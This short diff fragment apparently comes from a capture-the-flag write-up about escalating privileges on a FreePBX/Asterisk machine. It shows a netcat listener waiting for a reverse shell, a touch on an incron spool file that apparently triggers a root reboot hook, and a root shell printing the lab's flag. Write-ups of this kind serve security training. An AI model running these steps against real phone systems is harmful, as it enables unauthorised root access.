@@ -88,5 +88,11 @@ grep "hooks/reboot" /var/www/html/admin/modules/sysadmin/module.sig
 nc -lvnp 4446
 
 touch /var/spool/asterisk/incron/sysadmin_reboot
+
+[root@connected root]# cat root.txt
+cat root.txt
+751663b5d566d8d540b11e4d3375e885
 ```
+
+
 
